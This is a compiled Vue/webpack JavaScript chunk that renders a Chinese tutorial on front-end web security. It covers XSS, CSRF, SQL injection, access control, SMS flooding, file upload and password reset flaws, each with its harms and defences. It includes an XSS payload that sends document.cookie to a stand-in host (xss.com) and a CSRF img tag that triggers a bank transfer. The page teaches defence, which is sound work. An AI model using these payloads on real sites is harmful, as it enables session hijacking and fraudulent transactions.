(window.webpackJsonp=window.webpackJsonp||[]).push([[16],{162:function(a,t,r){a.exports=r.p+"assets/img/common.47debbd2.png"},296:function(a,t,r){"use strict";r.r(t);var s=[function(){var a=this,t=a.$createElement,s=a._self._c||t;return s("div",{staticClass:"content"},[s("h2",{attrs:{id:"前端安全"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#前端安全","aria-hidden":"true"}},[a._v("#")]),a._v(" 前端安全")]),s("h3",{attrs:{id:"xss跨站脚本"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#xss跨站脚本","aria-hidden":"true"}},[a._v("#")]),a._v(" XSS跨站脚本")]),s("h4",{attrs:{id:"危害"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("ol",[s("li",[a._v("网络钓鱼，盗取各类用户账号")]),s("li",[a._v("盗取cookie，从而获取用户隐私信息，利用用户身份进一步对网站进行操作")]),s("li",[a._v("劫持用户（浏览器）会话， 从而执行任意操作，如进行非法转账、发表日志、发送电子邮件等")]),s("li",[a._v("网页挂马")]),s("li",[a._v("进行恶意操作，例如篡改页面信息、删除文章等。")]),s("li",[a._v("进行大量的客户端攻击，DDOS")]),s("li",[a._v("获取客户端信息，如用户的浏览历史、真实IP、开放端口等")]),s("li",[a._v("控制受害者机器向其他网站发起攻击")]),s("li",[a._v("结合其他漏洞，如csrf，实施进一步作恶")]),s("li",[a._v("提升用户权限，包括进一步渗透网站")]),s("li",[a._v("传播跨站脚本蠕虫等")])]),s("h4",{attrs:{id:"分类"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#分类","aria-hidden":"true"}},[a._v("#")]),a._v(" 分类")]),s("ol",[s("li",[a._v("反射型")]),s("li",[a._v("存储型")])]),s("h4",{attrs:{id:"防范"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("ol",[s("li",[a._v("HttpOnly 防止截取Cookie(后台容器设置)")]),s("li",[a._v("输入检查")]),s("li",[a._v("输出检查 - 服务端转义")])]),s("h4",{attrs:{id:"举例"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#举例","aria-hidden":"true"}},[a._v("#")]),a._v(" 举例")]),s("ol",[s("li",[a._v("某网站搜索框")])]),s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 在搜索框里输入关键字 <script>alert(1)<\/script>")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 后台没有做过滤 返回相应的搜索关键字  http://www.xxx.com?keyword=<script>alert(1)<\/script>")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 页面会弹出框1")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 升级为危险的代码<script>document.location='http://xss.com/get?cookie='+document.cookie<\/script>")]),a._v("\n")])])]),s("p",[a._v("反射型是需要用户输入的\n存储型是不需要输入的，在加载网页代码的时候就已经执行了")]),s("h3",{attrs:{id:"csrf跨站请求伪造"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#csrf跨站请求伪造","aria-hidden":"true"}},[a._v("#")]),a._v(" CSRF跨站请求伪造")]),s("h4",{attrs:{id:"危害-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("ol",[s("li",[a._v("以你的名义发送邮件")]),s("li",[a._v("购买商品")]),s("li",[a._v("虚拟货币转账")])]),s("h4",{attrs:{id:"原理"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#原理","aria-hidden":"true"}},[a._v("#")]),a._v(" 原理")]),s("ol",[s("li",[a._v("攻击者盗用了你的身份，以你的身份发送恶意请求")])]),s("h4",{attrs:{id:"防范-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("ol",[s("li",[a._v("加密cookie")]),s("li",[a._v("cookie有效期")]),s("li",[a._v("表单增加hash值")]),s("li",[a._v("token")]),s("li",[a._v("referer")]),s("li",[a._v("post请求")]),s("li",[a._v("验证码")])]),s("h4",{attrs:{id:"举例-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#举例-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 举例")]),s("div",{staticClass:"language-js extra-class"},[s("pre",{pre:!0,attrs:{class:"language-js"}},[s("code",[s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 用户登录网银A 留下了会话")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 用户访问危险网站B，B里有一段危险代码")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("<")]),a._v("img src"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'http://www.bank.com/transfer.php?bankId=111&money=10000'")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("/")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("// 自动加载这段代码，B访问A并带上相应的会话信息，A经过验证，进行转帐操作")]),a._v("\n")])])]),s("h3",{attrs:{id:"sql注入"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sql注入","aria-hidden":"true"}},[a._v("#")]),a._v(" SQL注入")]),s("h4",{attrs:{id:"危害-3"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害-3","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("ol",[s("li",[a._v("获取网站数据")]),s("li",[a._v("通过mysql写入文件，getshell")])]),s("h4",{attrs:{id:"原理-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#原理-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 原理")]),s("p",[a._v("直接修改sql语句进行操作")]),s("h4",{attrs:{id:"防范-3"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-3","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("p",[a._v("优化获取参数和执行sql")]),s("h3",{attrs:{id:"越权访问"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#越权访问","aria-hidden":"true"}},[a._v("#")]),a._v(" \b越权访问")]),s("h4",{attrs:{id:"危害-4"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害-4","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("ol",[s("li",[a._v("查看、修改、删除他人信息")]),s("li",[a._v("进行其他未授权操作（冒充用户、提取账号余额等）")])]),s("h4",{attrs:{id:"原因"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#原因","aria-hidden":"true"}},[a._v("#")]),a._v(" 原因")]),s("ol",[s("li",[a._v("开发人员对客户端请求的数据过分相信，遗漏判断")])]),s("h4",{attrs:{id:"防范-4"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-4","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("ol",[s("li",[a._v("用户是否有权限访问该页面")]),s("li",[a._v("用户是否有操作权限")]),s("li",[a._v("根据保存在会话里的ID判断是否有权限")])]),s("h3",{attrs:{id:"短信验证码"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#短信验证码","aria-hidden":"true"}},[a._v("#")]),a._v(" 短信验证码")]),s("h4",{attrs:{id:"原因-2"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#原因-2","aria-hidden":"true"}},[a._v("#")]),a._v(" 原因")]),s("p",[a._v("未做限制，短时间被大量发送")]),s("h4",{attrs:{id:"防范-5"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-5","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("p",[a._v("服务器端一段时间内对一个号码做限定次数")]),s("h3",{attrs:{id:"任意文件上传漏洞"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#任意文件上传漏洞","aria-hidden":"true"}},[a._v("#")]),a._v(" 任意文件上传\b漏洞")]),s("h4",{attrs:{id:"危害-5"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害-5","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("ol",[s("li",[a._v("针对上传功能的dos攻击")]),s("li",[a._v("上传的文件在服务器上被执行，导致服务器沦陷")]),s("li",[a._v("诱使用户下载恶意文件")])]),s("h4",{attrs:{id:"防范-6"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-6","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("ol",[s("li",[a._v("文件上传目录不可执行")]),s("li",[a._v("判断文件类型")]),s("li",[a._v("使用随机数改写文件名和文件路径")]),s("li",[a._v("单独设置文件服务器的域名")])]),s("h3",{attrs:{id:"任意用户密码重置"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#任意用户密码重置","aria-hidden":"true"}},[a._v("#")]),a._v(" 任意用户密码重置")]),s("h4",{attrs:{id:"危害-6"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#危害-6","aria-hidden":"true"}},[a._v("#")]),a._v(" 危害")]),s("p",[a._v("暴力破解")]),s("h4",{attrs:{id:"防范-7"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#防范-7","aria-hidden":"true"}},[a._v("#")]),a._v(" 防范")]),s("ol",[s("li",[a._v("限制验证码尝试次数")]),s("li",[a._v("增加短信验证码长度")]),s("li",[a._v("图形验证码")]),s("li",[a._v("增加随机数")])]),s("p",[a._v("整理了一下前端安全问题，看导图"),s("br"),s("img",{attrs:{src:r(162),alt:"前端安全"}})])])}],e=r(0),i=Object(e.a)({},function(){var a=this.$createElement;this._self._c;return this._m(0)},s,!1,null,null,null);t.default=i.exports}}]);